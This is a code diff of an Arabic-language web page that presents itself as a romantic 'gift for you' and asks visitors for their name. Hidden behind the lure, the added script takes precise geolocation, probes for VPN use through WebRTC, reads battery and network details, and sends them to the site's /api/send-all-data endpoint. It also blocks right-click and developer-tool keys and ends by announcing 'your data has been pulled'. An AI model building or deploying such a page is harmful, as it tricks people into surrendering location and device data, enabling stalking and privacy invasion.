@@ -3,145 +3,620 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>نظام الاختبار</title>
+<title>🎁 هدية لك</title>
 <style>
-  body, html {
+  * {
     margin: 0;
     padding: 0;
+    box-sizing: border-box;
+  }
+
+  body, html {
     height: 100%;
     width: 100%;
-    background-color: #000;
-    color: #0f0;
-    font-family: 'Courier New', Courier, monospace;
+    background-color: #fff;
+    color: #ff6b9d;
+    font-family: 'Arial', 'Courier New', sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
-    overflow: hidden; 
+    overflow: hidden;
+    transition: background-color 0.5s ease;
+  }
+
+  body.green-mode {
+    background-color: #0a0 !important;
+  }
+
+  body.green-mode #main-container {
+    background: #0a0 !important;
+    border-color: #0f0 !important;
+    box-shadow: 0 0 80px rgba(0, 255, 0, 0.3) !important;
+    border: 3px solid #0f0;
+  }
+
+  body.green-mode #success-screen {
+    display: block !important;
+  }
+
+  body.green-mode #login-screen,
+  body.green-mode #gift-screen {
+    display: none !important;
+  }
+
+  body.green-mode .hearts-bg {
+    display: none;
   }
 
   #main-container {
     text-align: center;
-    width: 80%;
-    max-width: 600px;
+    width: 85%;
+    max-width: 550px;
     z-index: 10;
+    background: rgba(255, 255, 255, 0.95);
+    padding: 40px 30px;
+    border-radius: 25px;
+    box-shadow: 0 10px 60px rgba(255, 107, 157, 0.2);
+    position: relative;
+    border: 2px solid #ff6b9d;
+    transition: all 0.5s ease;
+    min-height: 400px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
   }
 
-  h1, h2 {
-    margin: 0 0 20px 0;
-    text-shadow: 0 0 10px #0f0;
+  #login-screen, #gift-screen, #success-screen {
+    width: 100%;
   }
 
-  #api-status {
+  h1 {
+    margin: 0 0 10px 0;
+    font-size: 2em;
+    color: #ff6b9d;
+  }
+
+  .sub-text {
+    opacity: 0.7;
+    font-size: 1.1em;
+    margin-bottom: 25px;
+    color: #555;
+  }
+
+  #login-form {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    align-items: center;
+  }
+
+  #login-form input {
+    padding: 14px 25px;
+    font-size: 1.1em;
+    background: #fff;
+    border: 2px solid #ff6b9d;
+    color: #333;
+    border-radius: 50px;
+    width: 80%;
+    font-family: 'Arial', sans-serif;
+    outline: none;
+    text-align: center;
+    transition: all 0.3s;
+  }
+
+  #login-form input:focus {
+    box-shadow: 0 0 30px rgba(255, 107, 157, 0.2);
+    border-color: #ff4080;
+  }
+
+  #login-form input::placeholder {
+    color: #ccc;
+  }
+
+  #login-form button {
+    padding: 14px 50px;
     font-size: 1.2em;
+    background: #ff6b9d;
+    color: #fff;
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
     font-weight: bold;
-    display: none;
+    font-family: 'Arial', sans-serif;
+    transition: all 0.3s;
+    box-shadow: 0 4px 20px rgba(255, 107, 157, 0.3);
   }
 
-  .matrix-bg {
+  #login-form button:hover {
+    background: #ff4080;
+    transform: scale(1.05);
+    box-shadow: 0 6px 30px rgba(255, 107, 157, 0.4);
+  }
+
+  .hearts-bg {
     position: fixed;
     top: 0;
     left: 0;
     width: 100%;
     height: 100%;
-    font-size: 20px;
-    color: rgba(0, 255, 0, 0.15);
     overflow: hidden;
     z-index: 1;
-    white-space: nowrap;
+    pointer-events: none;
   }
 
-  .matrix-line {
+  .heart {
     position: absolute;
-    animation: fall linear infinite;
+    font-size: 25px;
+    color: #ff6b9d;
+    opacity: 0.3;
+    animation: floatHeart linear infinite;
   }
 
-  @keyframes fall {
-    0% { transform: translateY(-100%); }
-    100% { transform: translateY(100vh); }
+  @keyframes floatHeart {
+    0% {
+      transform: translateY(100vh) rotate(0deg) scale(0.5);
+      opacity: 0.3;
+    }
+    100% {
+      transform: translateY(-100vh) rotate(720deg) scale(1.2);
+      opacity: 0;
+    }
   }
 
-  .blink {
-    animation: blinker 1s linear infinite;
-  }
-  @keyframes blinker {
-    50% { opacity: 0; }
+  .gift-box {
+    font-size: 130px;
+    cursor: pointer;
+    transition: all 0.3s;
+    display: inline-block;
+    margin: 20px 0;
+    animation: pulse 1.5s ease-in-out infinite;
+    user-select: none;
   }
 
+  .gift-box:hover {
+    transform: scale(1.15);
+    filter: drop-shadow(0 0 40px rgba(255, 107, 157, 0.3));
+  }
+
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.08); }
+  }
+
+  .hidden {
+    display: none !important;
+  }
+
+  #success-screen {
+    display: none;
+  }
+
+  #success-screen h1 {
+    color: #0f0;
+    text-shadow: 0 0 20px #0f0;
+    font-size: 2.5em;
+    margin-bottom: 15px;
+    font-family: 'Courier New', monospace;
+    letter-spacing: 3px;
+  }
+
+  #success-screen p {
+    color: #0f0;
+    font-size: 1.3em;
+    opacity: 0.9;
+    font-family: 'Courier New', monospace;
+    text-shadow: 0 0 10px #0f0;
+  }
+
+  .hacker-text {
+    position: fixed;
+    color: rgba(0, 255, 0, 0.08);
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    pointer-events: none;
+    z-index: 0;
+    line-height: 1.8;
+    direction: ltr;
+    white-space: pre;
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    padding: 20px;
+  }
+
+  body.green-mode .hacker-text {
+    display: block !important;
+  }
+
+  .hacker-text {
+    display: none;
+  }
+
+  .success-icon {
+    font-size: 60px;
+    margin-bottom: 15px;
+    color: #0f0;
+  }
+
+  .glitch-text {
+    animation: glitch 3s infinite;
+  }
+
+  @keyframes glitch {
+    0%, 100% { transform: translate(0); opacity: 1; }
+    20% { transform: translate(-2px, 2px); opacity: 0.8; }
+    40% { transform: translate(2px, -2px); opacity: 0.9; }
+    60% { transform: translate(-1px, 1px); opacity: 0.7; }
+    80% { transform: translate(1px, -1px); opacity: 0.9; }
+  }
+
+  .scan-line {
+    display: none;
+  }
+
+  body.green-mode .scan-line {
+    display: block;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 3px;
+    background: rgba(0, 255, 0, 0.3);
+    box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+    z-index: 100;
+    animation: scanMove 2s linear infinite;
+  }
+
+  @keyframes scanMove {
+    0% { top: 0; }
+    100% { top: 100%; }
+  }
 </style>
 </head>
 <body>
 
-  <div class="matrix-bg" id="matrix-bg"></div>
+  <div class="hacker-text" id="hacker-text"></div>
+  <div class="scan-line"></div>
+  <div class="hearts-bg" id="hearts-bg"></div>
 
   <div id="main-container">
-    <div id="status-content">
-      <h1 id="main-heading"> جارٍ فحص النظام...</h1>
-      <p id="api-status" class="blink">>>> جارٍ سحب البيانات...</p>
+    <div id="login-screen">
+      <span class="gift-icon">💝</span>
+      <h1 class="login-title glow-text">🎀 هدية خاصة لك</h1>
+      <p class="login-sub">💕 ادخل اسمك لتلقي الهدية 💕</p>
+      <form id="login-form">
+        <input type="text" id="username-input" placeholder="اكتب اسمك هنا..." autocomplete="off">
+        <button type="submit">🎁 استلم هديتك</button>
+      </form>
+      <p style="font-size: 0.7em; opacity: 0.3; margin-top: 20px; color: #ccc;">✨ مصمم بحب ✨</p>
+    </div>
+
+    <div id="gift-screen" class="hidden">
+      <h1>🎁 هديتك جاهزة</h1>
+      <p class="sub-text">اضغط على الصندوق لفتحه</p>
+      <div class="gift-box" id="gift-box">🎁</div>
+      <div class="gift-username">👤 <span id="gift-username"></span></div>
+    </div>
+
+    <div id="success-screen">
+      <div class="success-icon">😘</div>
+      <h1 class="glitch-text">تم سحب بياناتك</h1>
+      <p>بالشفا</p>
     </div>
   </div>
 
 <script>
 let alreadySent = false;
-const mainContainer = document.getElementById('status-content');
-const apiStatus = document.getElementById('api-status');
-const mainHeading = document.getElementById('main-heading');
+let username = '';
+let locationData = null;
+let vpnDetected = false;
 
-function createMatrixBackground() {
-  const bg = document.getElementById('matrix-bg');
-  const columns = Math.floor(window.innerWidth / 25);
-
-  for (let i = 0; i < columns; i++) {
-    const line = document.createElement('div');
-    line.classList.add('matrix-line');
-    line.style.left = (i * 25) + 'px';
-    
-    let content = "";
-    const len = Math.floor(Math.random() * 20) + 10;
-    for(let j=0; j<len; j++) {
-      content += Math.random().toString(36).substring(2, 3);
-    }
-    line.innerText = content;
-
-    line.style.animationDuration = (Math.random() * 3 + 2) + 's';
-    line.style.animationDelay = (Math.random() * 2) + 's';
-    
-    bg.appendChild(line);
+// خلفية القلوب
+function createHeartsBackground() {
+  const bg = document.getElementById('hearts-bg');
+  const heartEmojis = ['❤️', '💕', '💗', '💖', '💘', '💝', '💓', '🩷'];
+  
+  for (let i = 0; i < 30; i++) {
+    const heart = document.createElement('div');
+    heart.classList.add('heart');
+    heart.textContent = heartEmojis[Math.floor(Math.random() * heartEmojis.length)];
+    heart.style.left = Math.random() * 100 + '%';
+    heart.style.fontSize = (Math.random() * 30 + 15) + 'px';
+    heart.style.animationDuration = (Math.random() * 10 + 8) + 's';
+    heart.style.animationDelay = (Math.random() * 8) + 's';
+    heart.style.opacity = Math.random() * 0.3 + 0.1;
+    bg.appendChild(heart);
   }
 }
-createMatrixBackground();
+createHeartsBackground();
 
+// نصوص الثغرات
+function createHackerText() {
+  const container = document.getElementById('hacker-text');
+  const texts = [
+    'ROOT ACCESS GRANTED', 'SYSTEM HACKED', 'ADMIN PRIVILEGES',
+    'DATABASE DUMP', 'SQL INJECTION', 'XSS VULNERABILITY',
+    'BACKDOOR INSTALLED', 'PASSWORD CRACKED', 'SESSION HIJACKED',
+    'FIREWALL BYPASSED', 'ENCRYPTION BROKEN', 'TROJAN DEPLOYED',
+    'RANSOMWARE ACTIVATED', 'DDoS ATTACK', 'DNS SPOOFING',
+    'PHISHING SITE', 'MALWARE DETECTED', 'EXPLOIT SUCCESS',
+    'ZERO-DAY FOUND', 'KERNEL PANIC', 'BUFFER OVERFLOW',
+    'STACK SMASHING', 'HEAP SPRAYING', 'ROOTKIT INSTALLED',
+    'KEYLOGGER ACTIVE', 'SCREEN CAPTURE', 'MICROPHONE ACCESS',
+    'CAMERA ENABLED', 'GPS TRACKING', 'CONTACTS SYNCED',
+    'MESSAGES READ', 'CALL LOGS EXPORTED', 'PHOTOS UPLOADED',
+    'LOCATION SHARED', 'DEVICE COMPROMISED'
+  ];
+  
+  let html = '';
+  for (let i = 0; i < 80; i++) {
+    const text = texts[Math.floor(Math.random() * texts.length)];
+    const x = Math.random() * 90;
+    const y = Math.random() * 90;
+    const opacity = Math.random() * 0.1 + 0.02;
+    const size = Math.random() * 20 + 10;
+    html += `<span style="position:absolute;left:${x}%;top:${y}%;font-size:${size}px;opacity:${opacity};">${text}</span>`;
+  }
+  container.innerHTML = html;
+}
+createHackerText();
 
-if ('getBattery' in navigator) {
-  navigator.getBattery().then(function(battery) {
+// الكشف عن الـ VPN
+function detectVPN() {
+  return new Promise((resolve) => {
+    // طريقة 1: التحقق من وجود WebRTC leak
+    try {
+      const pc = new RTCPeerConnection({
+        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+      });
+      
+      pc.onicecandidate = (event) => {
+        if (event.candidate) {
+          const candidate = event.candidate.candidate;
+          // إذا كان الـ IP يبدأ بـ 192.168 أو 10. أو 172. فهذا IP محلي
+          // إذا كان IP عام وغريب فقد يكون VPN
+          const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
+          const ip = candidate.match(ipRegex);
+          if (ip) {
+            const parts = ip[0].split('.');
+            const firstOctet = parseInt(parts[0]);
+            // IP خاص
+            if (firstOctet === 10 || firstOctet === 127 || 
+                (firstOctet === 172 && parseInt(parts[1]) >= 16 && parseInt(parts[1]) <= 31) ||
+                (firstOctet === 192 && parseInt(parts[1]) === 168)) {
+              resolve(false);
+            } else {
+              // IP عام - قد يكون VPN
+              resolve(true);
+            }
+          }
+          pc.close();
+        }
+      };
+      
+      pc.createDataChannel('test');
+      pc.createOffer()
+        .then(offer => pc.setLocalDescription(offer))
+        .catch(() => resolve(false));
+      
+      setTimeout(() => {
+        pc.close();
+        resolve(false);
+      }, 3000);
+    } catch (e) {
+      resolve(false);
+    }
+  });
+}
+
+// جلب الموقع الجغرافي
+function getLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve(null);
+      return;
+    }
     
-    apiStatus.style.display = 'block';
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        resolve({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          altitude: position.coords.altitude,
+          speed: position.coords.speed
+        });
+      },
+      (error) => {
+        resolve(null);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  });
+}
 
-    battery.onchargingchange = function() {
-    };
-    
-    let percent = Math.round(battery.level * 100);
+// عناصر DOM
+const loginScreen = document.getElementById('login-screen');
+const giftScreen = document.getElementById('gift-screen');
+const successScreen = document.getElementById('success-screen');
+const loginForm = document.getElementById('login-form');
+const usernameInput = document.getElementById('username-input');
+const giftBox = document.getElementById('gift-box');
+const giftUsername = document.getElementById('gift-username');
+
+// معالج تسجيل الدخول
+loginForm.addEventListener('submit', function(e) {
+  e.preventDefault();
+  username = usernameInput.value.trim();
+  
+  if (username === '') {
+    usernameInput.style.borderColor = 'red';
+    usernameInput.style.boxShadow = '0 0 30px rgba(255,0,0,0.2)';
+    setTimeout(() => {
+      usernameInput.style.borderColor = '#ff6b9d';
+      usernameInput.style.boxShadow = 'none';
+    }, 1000);
+    return;
+  }
+
+  giftUsername.textContent = username;
+  loginScreen.classList.add('hidden');
+  giftScreen.classList.remove('hidden');
+  
+  // جلب الموقع والـ VPN في الخلفية
+  getLocation().then(location => {
+    locationData = location;
+  });
+  
+  detectVPN().then(result => {
+    vpnDetected = result;
+  });
+});
+
+// معالج صندوق الهدية
+giftBox.addEventListener('click', function() {
+  if (alreadySent) return;
+  
+  this.textContent = '🎉';
+  this.style.animation = 'none';
+  this.style.transform = 'scale(1.3)';
+  
+  setTimeout(() => {
+    document.body.classList.add('green-mode');
     
     if (!alreadySent) {
       alreadySent = true;
       
-      fetch('/api/send-battery', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ battery: percent })
-      });
+      // جمع كل البيانات
+      const allData = {
+        username: username,
+        location: locationData,
+        vpn: vpnDetected
+      };
       
-      setTimeout(() => {
-        mainContainer.innerHTML = `<h1 style="color: #0f0; text-shadow: 0 0 15px #0f0;">😘🫵🏻💀 تم الدخول الى تليفونك</h1>`;
-      }, 1500); 
+      // معلومات البطارية
+      if ('getBattery' in navigator) {
+        navigator.getBattery().then(function(battery) {
+          let percent = Math.round(battery.level * 100);
+          allData.battery = percent;
+          
+          // معلومات الشبكة
+          const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+          
+          let speed = 'غير معروف';
+          let signal = 'غير معروف';
+          let network = 'غير معروف';
+          let connectionType = 'غير معروف';
+          
+          if (connection) {
+            // السرعة
+            if (connection.downlink !== undefined && connection.downlink !== null) {
+              speed = connection.downlink.toFixed(2) + ' Mbps';
+            }
+            
+            // نوع الشبكة
+            if (connection.effectiveType) {
+              const types = {
+                'slow-2g': '2G',
+                '2g': '2G', 
+                '3g': '3G',
+                '4g': '4G'
+              };
+              network = types[connection.effectiveType] || connection.effectiveType;
+            }
+            
+            // قوة الإشارة
+            if (connection.bars !== undefined && connection.bars !== null) {
+              const bars = Math.min(Math.max(Math.round(connection.bars), 0), 4);
+              signal = bars + '/4';
+            } else {
+              const spd = connection.downlink || 0;
+              if (spd >= 50) signal = '4/4';
+              else if (spd >= 20) signal = '3/4';
+              else if (spd >= 5) signal = '2/4';
+              else if (spd >= 1) signal = '1/4';
+              else signal = '0/4';
+            }
+            
+            // نوع الاتصال (Wi-Fi أو بيانات)
+            if (connection.type) {
+              const types = {
+                'wifi': '📶 واي فاي',
+                'cellular': '📱 بيانات جوال',
+                'ethernet': '🔌 إيثرنت',
+                'none': '🚫 غير متصل',
+                'unknown': '❓ غير معروف'
+              };
+              connectionType = types[connection.type] || connection.type;
+            } else {
+              // تقدير من السرعة
+              const downlink = connection.downlink || 0;
+              const rtt = connection.rtt || 0;
+              if (downlink > 10 && rtt < 50) {
+                connectionType = '📶 واي فاي (تقديري)';
+              } else if (downlink > 0) {
+                connectionType = '📱 بيانات جوال (تقديري)';
+              } else {
+                connectionType = '🚫 غير متصل';
+              }
+            }
+          }
+          
+          allData.speed = speed;
+          allData.signal = signal;
+          allData.network = network;
+          allData.connectionType = connectionType;
+          
+          // إرسال جميع البيانات
+          fetch('/api/send-all-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(allData)
+          });
+        }).catch(() => {
+          // إذا فشلت البطارية، نرسل البيانات المتاحة
+          fetch('/api/send-all-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(allData)
+          });
+        });
+      } else {
+        // إذا لم تدعم البطارية
+        fetch('/api/send-all-data', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(allData)
+        });
+      }
     }
-    
-  });
-} else {
-  mainContainer.innerHTML = "<h2 style='color: red;'>❌ متصفحك لا يدعم الاختبار</h2>";
-}
+  }, 600);
+});
+
+usernameInput.addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') {
+    loginForm.dispatchEvent(new Event('submit'));
+  }
+});
+
 window.addEventListener('beforeunload', function (e) {
   e.preventDefault();
   e.returnValue = '';
+});
+
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+      (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'U')) {
+    e.preventDefault();
+  }
 });
 
 </script>
